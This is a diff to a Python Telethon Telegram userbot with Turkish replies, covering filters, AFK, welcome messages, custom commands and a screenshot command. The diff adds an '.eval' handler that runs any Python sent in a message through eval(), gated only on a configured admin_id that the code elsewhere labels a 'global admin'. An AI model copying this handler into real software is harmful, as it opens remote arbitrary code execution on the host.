@@ -3,26 +3,30 @@ import os
 import sys
 import json
 import re
-import io
 import requests
 from telethon import TelegramClient, events
 from telethon.tl.functions.channels import EditBannedRequest
 from telethon.tl.types import ChatBannedRights
 from config import api_id, api_hash, session_name, admin_id
 
+
 client = TelegramClient(session_name, api_id, api_hash)
+
 
 afk_mode = False
 afk_reason = ""
 afk_replied_users = set()
+
 filtered_messages = {}
 all_filtered_messages = {}
 custom_commands = {}
+
 welcome_message = None
 welcome_enabled = False
 welcomed_users = set()
 
-# Veri dosyalarını yükle
+
+# Load data from files if they exist
 if os.path.exists("custom_commands.json"):
     with open("custom_commands.json", "r") as f:
         custom_commands = json.load(f)
@@ -42,7 +46,6 @@ if os.path.exists("all_filtered.json"):
         all_filtered_messages = json.load(f)
 
 
-# .alive
 @client.on(events.NewMessage(pattern=r"^.alive$"))
 async def alive_handler(event):
     if event.sender_id != (await client.get_me()).id:
@@ -51,7 +54,6 @@ async def alive_handler(event):
     await event.edit(f"Userbotunuz çalışıyor... Seni seviyorum {sender.first_name} ❤️\n\nBot Versiyonu: v1.0")
 
 
-# .wlive (global admin için)
 @client.on(events.NewMessage(pattern=r"^.wlive$"))
 async def wlive_handler(event):
     if event.sender_id != admin_id:
@@ -59,7 +61,6 @@ async def wlive_handler(event):
     await event.reply("🔥 JudgeBot Aktif 🔥\nVersiyon: v1.0\nSorunsuz çalışıyor.")
 
 
-# .judge
 @client.on(events.NewMessage(pattern=r"^.judge$"))
 async def judge_handler(event):
     if event.sender_id != (await client.get_me()).id:
@@ -70,14 +71,14 @@ async def judge_handler(event):
         ".filter <kelime> <cevap>\n.unfilter <kelime>\n.filters\n"
         ".allfilter <kelime> <cevap>\n.unallfilter <kelime>\n.allfilters\n"
         ".ekle <.komut> <cevap>\n.sil <.komut>\n"
-        ".restart\n.kick\n.ban\n.eval\n"
+        ".restart\n.kick\n.ban\n.eval <kod>\n"
         ".welcome <mesaj>\n.unwelcome\n"
-        ".ss <site>\n.wlive"
+        ".ss <url>\n"
+        ".wlive"
     )
     await event.reply(help_text)
 
 
-# .afk / .back
 @client.on(events.NewMessage(pattern=r"^.afk (.+)"))
 async def afk_handler(event):
     if event.sender_id != (await client.get_me()).id:
@@ -109,7 +110,6 @@ async def afk_auto_reply(event):
                 afk_replied_users.add(event.sender_id)
 
 
-# .filter
 @client.on(events.NewMessage(pattern=r"^.filter (\S+) ([\s\S]+)"))
 async def filter_handler(event):
     if event.sender_id != (await client.get_me()).id:
@@ -155,7 +155,6 @@ async def filter_response(event):
                 break
 
 
-# .allfilter
 @client.on(events.NewMessage(pattern=r"^.allfilter (\S+) ([\s\S]+)"))
 async def allfilter_handler(event):
     if event.sender_id != (await client.get_me()).id:
@@ -202,7 +201,6 @@ async def all_filter_response(event):
             break
 
 
-# .ekle / .sil
 @client.on(events.NewMessage(pattern=r"^.ekle (.\S+) ([\s\S]+)"))
 async def add_command(event):
     if event.sender_id != (await client.get_me()).id:
@@ -237,7 +235,6 @@ async def custom_command_handler(event):
         await event.reply(custom_commands[event.raw_text.strip()])
 
 
-# .restart
 @client.on(events.NewMessage(pattern=r"^.restart$"))
 async def restart_handler(event):
     if event.sender_id != (await client.get_me()).id:
@@ -246,7 +243,6 @@ async def restart_handler(event):
     os.execv(sys.executable, [sys.executable] + sys.argv)
 
 
-# .welcome / .unwelcome
 @client.on(events.NewMessage(pattern=r"^.welcome(?: ([\s\S]+))?"))
 async def welcome_handler(event):
     if event.sender_id != (await client.get_me()).id:
@@ -254,16 +250,16 @@ async def welcome_handler(event):
     global welcome_message, welcome_enabled, welcomed_users
     if event.pattern_match.group(1):
         welcome_message = event.pattern_match.group(1)
-        welcome_enabled = True
-        welcomed_users.clear()
         with open("welcome.json", "w") as f:
             json.dump({"message": welcome_message, "enabled": True}, f)
+        welcome_enabled = True
+        welcomed_users.clear()
         await event.reply("Karşılama mesajı ayarlandı ve aktif edildi.")
     elif welcome_message:
         welcome_enabled = True
-        welcomed_users.clear()
         with open("welcome.json", "w") as f:
             json.dump({"message": welcome_message, "enabled": True}, f)
+        welcomed_users.clear()
         await event.reply("Karşılama mesajı tekrar aktif edildi.")
     else:
         await event.reply("İlk önce bir karşılama mesajı belirlemelisin.")
@@ -289,29 +285,35 @@ async def welcome_auto(event):
             welcomed_users.add(sender_id)
 
 
-# .ss
 @client.on(events.NewMessage(pattern=r"^.ss (.+)"))
-async def screenshot_website(event):
+async def screenshot(event):
     if event.sender_id != (await client.get_me()).id:
         return
-    site = event.pattern_match.group(1)
-    await event.reply("📸 Ekran görüntüsü alınıyor...")
+    url = event.pattern_match.group(1)
+    api_url = f"https://image.thum.io/get/width/1200/{url}"
     try:
-        url = f"https://image.thum.io/get/width/1024/{site}"
-        r = requests.get(url)
-        if r.status_code == 200:
-            await client.send_file(event.chat_id, io.BytesIO(r.content), caption=f"{site}")
-        else:
-            await event.reply("Ekran görüntüsü alınamadı.")
+        await client.send_file(event.chat_id, api_url, caption=f"📸 Screenshot: {url}")
+    except Exception as e:
+        await event.reply(f"Ekran görüntüsü alınamadı: {str(e)}")
+
+
+@client.on(events.NewMessage(pattern=r"^.eval (.+)"))
+async def eval_handler(event):
+    if event.sender_id != admin_id:
+        return
+    code = event.pattern_match.group(1)
+    try:
+        result = eval(code)
+        await event.reply(str(result))
     except Exception as e:
         await event.reply(f"Hata: {str(e)}")
 
 
-# Başlatıcı
 async def main():
     await client.start()
     print("JudgeUserBot çalışıyor...")
     await client.run_until_disconnected()
+
 
 if __name__ == "__main__":
     asyncio.run(main())
